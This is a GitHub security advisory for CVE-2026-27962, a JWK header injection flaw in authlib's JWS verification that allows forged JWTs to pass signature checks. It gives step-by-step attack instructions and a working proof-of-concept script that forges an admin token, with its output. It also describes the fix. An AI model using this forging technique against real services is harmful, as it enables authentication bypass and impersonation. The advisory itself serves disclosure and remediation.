# [C] Authlib JWS JWK Header Injection: Signature Verification Bypass

## Summary
Severity: Critical
Advisory: GHSA-wvwj-cvrp-7pv5
CVE: CVE-2026-27962
CWE: CWE-347
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-wvwj-cvrp-7pv5
Type: github-advisory

## Affected
- PyPI: `authlib` — affected >=0 <1.6.9

## Details
## Description

### Summary

A JWK Header Injection vulnerability in `authlib`'s JWS implementation allows an unauthenticated
attacker to forge arbitrary JWT tokens that pass signature verification. When `key=None` is passed
to any JWS deserialization function, the library extracts and uses the cryptographic key embedded
in the attacker-controlled JWT `jwk` header field. An attacker can sign a token with their own
private key, embed the matching public key in the header, and have the server accept the forged
token as cryptographically valid — bypassing authentication and authorization entirely.

This behavior violates **RFC 7515 §4.1.3** and the validation algorithm defined in **RFC 7515 §5.2**.

### Details

**Vulnerable file:** `authlib/jose/rfc7515/jws.py`  
**Vulnerable method:** `JsonWebSignature._prepare_algorithm_key()`  
**Lines:** 272–273

```python
elif key is None and "jwk" in header:
    key = header["jwk"]   # ← attacker-controlled key used for verification
```

When `key=None` is passed to `jws.deserialize_compact()`, `jws.deserialize_json()`, or
`jws.deserialize()`, the library checks the JWT header for a `jwk` field. If present, it extracts
that value — which is fully attacker-controlled — and uses it as the verification key.

**RFC 7515 violations:**

- **§4.1.3** explicitly states the `jwk` header parameter is **"NOT RECOMMENDED"** because keys
  embedded by the token submitter cannot be trusted as a verification anchor.
- **§5.2 (Validation Algorithm)** specifies the verification key MUST come from the *application
  context*, not from the token itself. There is no step in the RFC that permits falling back to
  the `jwk` header when no application key is provided.

**Why this is a library issue, not just a developer mistake:**

The most common real-world trigger is a **key resolver callable** used for JWKS-based key lookup.
A developer writes:

```python
def lookup_key(header, payload):
    kid = header.get("kid")
    return jwks_cache.get(kid)   # returns None when kid is unknown/rotated

jws.deserialize_compact(token, lookup_key)
```

When an attacker submits a token with an unknown `kid`, the callable legitimately returns `None`.
The library then silently falls through to `key = header["jwk"]`, trusting the attacker's embedded
key. The developer never wrote `key=None` — the library's fallback logic introduced it. The result
looks like a verified token with no exception raised, making the substitution invisible.

**Attack steps:**

1. Attacker generates an RSA or EC keypair.
2. Attacker crafts a JWT payload with any desired claims (e.g. `{"role": "admin"}`).
3. Attacker signs the JWT with their **private** key.
4. Attacker embeds their **public** key in the JWT `jwk` header field.
5. Attacker uses an unknown `kid` to cause the key resolver to return `None`.
6. The library uses `header["jwk"]` for verification — signature passes.
7. Forged claims are returned as authentic.

### PoC

Tested against **authlib 1.6.6** (HEAD `a9e4cfee`, Python 3.11).

**Requirements:**
```
pip install authlib cryptography
```

**Exploit script:**
```python
from authlib.jose import JsonWebSignature, RSAKey
import json

jws = JsonWebSignature(["RS256"])

# Step 1: Attacker generates their own RSA keypair
attacker_private = RSAKey.generate_key(2048, is_private=True)
attacker_public_jwk = attacker_private.as_dict(is_private=False)

# Step 2: Forge a JWT with elevated privileges, embed public key in header
header = {"alg": "RS256", "jwk": attacker_public_jwk}
forged_payload = json.dumps({"sub": "attacker", "role": "admin"}).encode()
forged_token = jws.serialize_compact(header, forged_payload, attacker_private)

# Step 3: Server decodes with key=None — token is accepted
result = jws.deserialize_compact(forged_token, None)
claims = json.loads(result["payload"])
print(claims)  # {'sub': 'attacker', 'role': 'admin'}
assert claims["role"] == "admin"  # PASSES
```

**Expected output:**
```
{'sub': 'attacker', 'role': 'admin'}
```

**Docker (self-contained reproduction):**
```bash
sudo docker run --rm authlib-cve-poc:latest \
  python3 /workspace/pocs/poc_auth001_jws_jwk_injection.py
```

### Impact

This is an authentication and authorization bypass vulnerability. Any application using authlib's
JWS deserialization is affected when:

- `key=None` is passed directly, **or**
- a key resolver callable returns `None` for unknown/rotated `kid` values (the common JWKS lookup pattern)

An unauthenticated attacker can impersonate any user or assume any privilege encoded in JWT claims
(admin roles, scopes, user IDs) without possessing any legitimate credentials or server-side keys.
The forged token is indistinguishable from a legitimate one — no exception is raised.

This is a violation of **RFC 7515 §4.1.3** and **§5.2**. The spec is unambiguous: the `jwk`
header parameter is "NOT RECOMMENDED" as a key source, and the validation key MUST come from
the application context, not the token itself.

**Minimal fix** — remove the fallback from `authlib/jose/rfc7515/jws.py:272-273`:
```python
# DELETE:
elif key is None and "jwk" in header:
    key = header["jwk"]
```

**Recommended safe replacement** — raise explicitly when no key is resolved:
```python
if key is None:
    raise MissingKeyError("No key provided and no valid key resolvable from context.")
```

## References
- https://github.com/authlib/authlib/security/advisories/GHSA-wvwj-cvrp-7pv5
- https://nvd.nist.gov/vuln/detail/CVE-2026-27962
- https://github.com/authlib/authlib/commit/a5d4b2d4c9e46bfa11c82f85fdc2bcc0b50ae681
- https://github.com/authlib/authlib
- https://github.com/authlib/authlib/releases/tag/v1.6.9
